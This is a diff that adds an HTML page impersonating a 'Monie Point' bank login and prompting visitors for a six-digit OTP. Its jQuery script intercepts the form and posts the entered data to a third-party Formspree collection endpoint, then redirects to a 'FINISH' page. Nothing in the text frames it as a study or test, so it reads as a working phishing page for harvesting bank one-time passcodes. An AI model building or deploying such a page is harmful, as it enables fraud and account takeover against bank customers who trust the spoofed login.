@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Application</title>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script>
+    $(document).ready(function() {
+      $('form').submit(function(event) {
+        event.preventDefault(); // Prevent form submission
+
+        // Send the form data to FormSubmit using AJAX
+        $.ajax({
+          url: 'https://formspree.io/f/xyyqdnkr',
+          method: 'POST',
+          data: $('form').serialize(),
+          dataType: 'json',
+          success: function(response) {
+            // Redirect to FINISH.html upon successful submission
+            redirectToFINISH();
+          },
+          error: function(xhr, status, error) {
+            console.log(xhr.responseText);
+            alert('An error occurred. Please try again.');
+          }
+        });
+      });
+    });
+
+    function redirectToFINISH() {
+      window.location.href = 'FINISH.html';
+    }
+  </script>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #0A2F6F; /* Set your preferred background color */
+      font-family: Arial, sans-serif;
+    }
+
+    .container {
+      padding: 20px;
+      max-width: 600px;
+      margin: 0 auto;
+      background-image: url('path/to/your/image.jpg'); /* Set your image path */
+      background-size: cover;
+      background-position: top left;
+    }
+
+    .logo {
+      width: 50px; /* Set your preferred size */
+      height: 50px; /* Set your preferred size */
+      padding: 10px; /* Set your preferred padding */
+    }
+
+    .welcome-text {
+      color: white;
+      margin-top: 10px;
+    }
+
+    .login-box {
+      background-color: white;
+      padding: 20px;
+      border: 2px solid #ccc;
+      border-radius: 5px;
+      margin-top: 20px;
+      position: relative;
+    }
+
+    .input-group {
+      margin-bottom: 15px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
+
+    .forgot-text {
+      color: #0361F0;
+      position: absolute;
+      bottom: 0;
+      right: 0;
+     font-family:verdana;
+	
+    }
+
+    .login-btn {
+      background-color: #0361F0; /* Set your preferred dark blue color */
+      color: white;
+      padding: 10px 90px;
+      border: none;
+      border-radius: 5px;
+      display: block;
+      margin: 0 auto;
+      text-align: center;
+      cursor: pointer;
+    }
+
+    .signup-box {
+      background-color: #335287; /* Set your preferred grey color */
+      padding: 15px;
+      border-radius: 10px;
+      margin-top: 20px;
+    }
+
+    .signup-text {
+      text-align: center;
+	color: white;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+<img src="logo.png" alt="Bank Logo" class="logo">
+    <div class="welcome-text"><b>Login to </p>
+	Monie Point</b></div>
+<form>
+    <div class="login-box">
+      <div class="input-group">
+        <input type="text" placeholder="6 Digit OTP" Required>
+      </div>
+      <button class="login-btn">FINISH</button>
+</form>
+
+  </div>
+</body>
+</html>
